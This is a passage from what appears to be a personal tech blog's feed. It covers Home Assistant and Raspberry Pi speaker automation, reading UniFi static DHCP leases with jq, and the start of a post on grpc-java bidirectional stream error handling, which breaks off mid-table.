&amp;lt;pre data-lang=&amp;quot;yaml&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-yaml &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-yaml&amp;quot; data-lang=&amp;quot;yaml&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;rest_command&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;restart_raspotify&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;url&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;&amp;amp;lt;Raspberry Pi IP&amp;amp;gt;:9876&amp;#x2F;?&amp;amp;lt;Secret Restart Password QueryString&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After another Home Assistant restart, you’ll be able to invoke the following service to restart Raspotify and make it re-authenticate using the configured credentials:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;yaml&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-yaml &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-yaml&amp;quot; data-lang=&amp;quot;yaml&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;service&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;rest_command.restart_raspotify
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;connecting-it-all-together-in-home-assistant&amp;quot;&amp;gt;Connecting It All Together in Home Assistant&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;I configured an automation to trigger when the motion sensor is activated - it will play the rainforest nature album (&amp;lt;code&amp;gt;spotify:album:2PPfl28ysMbOkl2DBJ5Dr4&amp;lt;&amp;#x2F;code&amp;gt;). When the motion sensor is deactivated - it runs restart_raspotify to reset Raspotify to the configured credentials and be ready for the next person to walk in.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If anyone wants the full Home Assistant setup, write a comment and I’ll upload that as well.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;adding-airplay-support&amp;quot;&amp;gt;Adding AirPlay Support&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Follow the instructions in the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;lewin.co.il&amp;#x2F;bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi&amp;#x2F;&amp;quot;&amp;gt;follow-up post&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;bonus-turning-ue-boom-on-via-raspberry-pi&amp;quot;&amp;gt;Bonus - Turning UE Boom On via Raspberry Pi&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;UE Boom is listening for Bluetooth commands even when turned off. You can use your phone (if paired with the speaker) to turn the speaker on remotely. You can do the same with Raspberry Pi after it’s connected. To do so, first install NodeJS (I chose version 14.15.4 while writing this, there’s probably a newer version available when you’re reading this). There’s no official NodeJS release for Raspberry Pi Zero W, but this unofficial installation works great for me:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;bash
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;export &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NODE_VER&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;14.15.4
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;! &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;node --version &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;grep -q ${NODE_VER}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;then
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  (&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cat &amp;#x2F;proc&amp;#x2F;cpuinfo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;grep -q &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Pi Zero&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;[ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;! &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;-d node-v${NODE_VER}-linux-armv6l &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;]&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;then
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Installing nodejs ${&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NODE_VER&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;} for armv6 from unofficial builds...&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;curl -O https:&amp;#x2F;&amp;#x2F;unofficial-builds.nodejs.org&amp;#x2F;download&amp;#x2F;release&amp;#x2F;v${NODE_VER}&amp;#x2F;node-v${NODE_VER}-linux-armv6l.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;tar -xf node-v${NODE_VER}-linux-armv6l.tar.xz
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Adding node to the PATH&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;PATH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;$(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pwd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;)&amp;#x2F;node-v${&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NODE_VER&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;}-linux-armv6l&amp;#x2F;bin:${&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;PATH&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After installing NodeJS, run the following script whenever you want to turn your UE Boom on. &amp;lt;strong&amp;gt;Make sure you replace 00:11:22:33:44:55 with your UE Boom’s Bluetooth MAC address, and AABBCCDDEEFF to your Raspberry Pi Zero W’s Bluetooth MAC address, the same client address you used for pairing.&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;set &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;-ue
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;HANDLE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;0x0003
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;VALUE&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;AABBCCDDEEFF01
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;MAC&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;00:11:22:33:44:55
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;gatttool -b $MAC --char-write-req --handle&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$HANDLE --value&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$VALUE
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>UniFi Static IP Leases</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-07-11-unifi-static-ip-leases&#x2F;"/>
            <updated>2021-07-11T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-07-11-unifi-static-ip-leases&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;In order to organize my UniFi-controlled network, I tried to look at all the static IP allocations I made using the UniFi portal.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Some lookups online suggested I use the &amp;quot;Insights&amp;quot; page on the UniFi portal, but I get a &amp;quot;No WiFi Networks found&amp;quot; error when I do:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;unifi-static-ip-leases&amp;#x2F;1.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I figured there’s a way to get the info through SSHing into the machine itself. Running &amp;lt;code&amp;gt;grep&amp;lt;&amp;#x2F;code&amp;gt; recursively throughout the filesystem made me find &amp;lt;code&amp;gt;&amp;#x2F;config&amp;#x2F;ubios-udapi-server&amp;#x2F;ubios-udapi-server.state&amp;lt;&amp;#x2F;code&amp;gt; which is a large JSON file containing device configuration. The DHCP static leases were listed under &amp;lt;code&amp;gt;services&amp;lt;&amp;#x2F;code&amp;gt; -&amp;amp;gt; &amp;lt;code&amp;gt;dhcpServers&amp;lt;&amp;#x2F;code&amp;gt; -&amp;amp;gt; &amp;lt;code&amp;gt;staticLeases&amp;lt;&amp;#x2F;code&amp;gt;. I wrote this small one-liner to retrieve the mapping as JSON array:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;cat &amp;#x2F;config&amp;#x2F;ubios-udapi-server&amp;#x2F;ubios-udapi-server.state &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;jq &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[.services.dhcpServers[0].staticLeases[] | {ip: .addresses[0], mac: .id}] | sort_by(.ip | split(&amp;amp;quot;.&amp;amp;quot;) | map(tonumber))&amp;amp;#39;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The output of this script is a JSON array of objects containing &amp;lt;code&amp;gt;ip&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;mac&amp;lt;&amp;#x2F;code&amp;gt;, for example:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;json&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-json &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-json&amp;quot; data-lang=&amp;quot;json&amp;quot;&amp;gt;&amp;lt;span&amp;gt;[
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;ip&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;192.168.1.2&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;mac&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;00:11:22:33:44:55&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  },
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;ip&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;192.168.1.3&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;mac&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;aa:bb:cc:dd:ee:ff&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Eventually I learned that the old UniFi network UI has a working Insights page containing all the static leases. In order to view this page, I had to go to the &amp;quot;System Settings&amp;quot; tab within the Network settings page and disable &amp;quot;New User Interface&amp;quot;:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;unifi-static-ip-leases&amp;#x2F;2.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Once I did that, I could visit the old Insights page and select the following filters to view all assigned static IP leases:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;unifi-static-ip-leases&amp;#x2F;3.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Inconsistencies in grpc-java Error Handling with Bidirectional Streams</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2020-10-27-inconsistencies-in-grpc-java-error-handling-with-bidirectional-streams&#x2F;"/>
            <updated>2020-10-27T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2020-10-27-inconsistencies-in-grpc-java-error-handling-with-bidirectional-streams&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;While working on a &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;grpc&amp;#x2F;grpc-java&amp;quot;&amp;gt;grpc-java&amp;lt;&amp;#x2F;a&amp;gt; project with &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;grpc.io&amp;#x2F;docs&amp;#x2F;languages&amp;#x2F;java&amp;#x2F;basics&amp;#x2F;#bidirectional-streaming-rpc&amp;quot;&amp;gt;bidirectional streaming&amp;lt;&amp;#x2F;a&amp;gt; I noticed lack of documentation on how to handle errors. I wanted to know when are errors thrown, and how should an error be handled after receiving one.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Since I could barely find any documentation online, I constructed a few tests of my own. I arranged a small project with a bidirectional gRPC service, and configured &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;junit.org&amp;#x2F;&amp;quot;&amp;gt;JUnit&amp;lt;&amp;#x2F;a&amp;gt; to perform a successful handshake over the loopback between a client and a server before each test. I was using the most recent version of &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt; (while writing this post) - &amp;lt;code&amp;gt;1.33.0&amp;lt;&amp;#x2F;code&amp;gt;. There are 4 &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects in all the tests:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Client Request - Implemented by &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt;, calling its &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; should trigger the appropriate Server Request &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Client Response - Implemented by me, receiving triggers from Server Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Server Request - Implemented by me, receiving triggers from Client Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Server Response - Implemented by &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt;, calling its &amp;lt;code&amp;gt;onNext()&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;onCompleted()&amp;lt;&amp;#x2F;code&amp;gt; should trigger the appropriate Client Response &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; object over the network.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;In the first group of tests - I wanted to check what &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; callbacks are triggered on the &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; objects when I call the 2 different &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; &amp;lt;code&amp;gt;grpc-java&amp;lt;&amp;#x2F;code&amp;gt; implementations. The columns represent the &amp;lt;code&amp;gt;StreamObserver&amp;lt;&amp;#x2F;code&amp;gt; the error was sent on (using &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt;). The rows represent the StreamObserver error was checked on (also, using &amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;table&amp;gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Client Request&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;strong&amp;gt;Server Response&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;th&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;&amp;lt;&amp;#x2F;thead&amp;gt;&amp;lt;tbody&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;strong&amp;gt;Server Request&amp;lt;&amp;#x2F;strong&amp;gt;&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;StatusRuntimeException(&amp;quot;CANCELLED: client cancelled&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;, &amp;lt;code&amp;gt;cause&amp;lt;&amp;#x2F;code&amp;gt; is &amp;lt;code&amp;gt;null&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;code&amp;gt;onError()&amp;lt;&amp;#x2F;code&amp;gt; not triggered&amp;lt;&amp;#x2F;td&amp;gt;&amp;lt;&amp;#x2F;tr&amp;gt;
